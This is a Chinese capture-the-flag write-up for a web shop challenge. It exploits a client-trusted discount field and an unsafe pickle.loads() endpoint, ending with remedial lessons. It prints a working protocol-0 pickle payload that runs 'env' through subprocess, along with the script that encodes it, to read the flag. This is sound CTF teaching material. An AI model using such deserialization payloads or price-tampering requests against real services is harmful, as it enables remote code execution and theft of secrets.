# 马哈鱼商店

## 题目简述

题目包含两个独立缺陷：购买接口信任客户端提交的折扣，可用极小正数低价购买 `Pickle`；随后 `/pickle_dsa` 对用户提供的 Base64 数据直接执行 `pickle.loads()`，仅过滤两个字节，最终可通过手写 Pickle 指令执行命令并读取环境变量中的 flag。

## 解题过程

注册用户初始余额为 `10000`，`Pickle` 商品原价为 `1000000`。购买接口直接读取客户端的 `discount`：

```python
discount = float(request.form.get('discount'))
final_price = product['price'] * discount

if final_price < 0 or discount <= 0 or discount > 1:
    return "Wrong Price", 400
```

因此提交 `pid=8&discount=0.001` 时，实际价格为 $1000000\times0.001=1000$，可以正常购买。这里没有服务端折扣表校验，商品页面显示的折扣不是可信边界。

不过按仓库源码进一步审计可知，`/pickle_dsa` 只检查用户是否登录，并未检查 `session['Pickle_Got']`。所以购买是题目设计的引导步骤，不是后端真正的授权条件；已登录用户也可以直接访问该路由。

反序列化入口如下：

```python
data = base64.b64decode(request.args.get('data'))
for b in [b'\x00', b'\x1e']:
    if b in data:
        return "卡了"
p = pickle.loads(data)
```

常规二进制 Pickle 协议可能包含被过滤字节，但文本形式的协议 0 不需要它们。下面的载荷调用 `subprocess.check_output(('env',))`：

```python
import base64
from urllib.parse import quote_plus

payload = b"csubprocess\ncheck_output\n(S'env'\ntR."
encoded = base64.b64encode(payload).decode()
print('/pickle_dsa?data=' + quote_plus(encoded))
```

生成的 Base64 数据为：

```text
Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CihTJ2VudicKdFIu
```

各协议 0 操作码的作用是：`c` 导入全局可调用对象，`(` 放置参数边界，`S` 压入字符串 `env`，`t` 组成一元元组，`R` 调用 `check_output`，`.` 结束反序列化。返回结果包含进程环境变量，其中可读到：

```text
0xGame{You_Have_Learned_How_to_Buy_Pickle!!}
```

## 方法总结

- 金额、折扣等业务数据必须由服务端计算，不能信任客户端回传值。
- `pickle.loads()` 会执行对象重建指令，不应处理不可信数据；过滤少数字节无法阻止协议 0 等等价载荷。
- 要区分前端流程与后端授权。本题购买成功页面提供入口，但真正的反序列化路由没有验证购买状态。
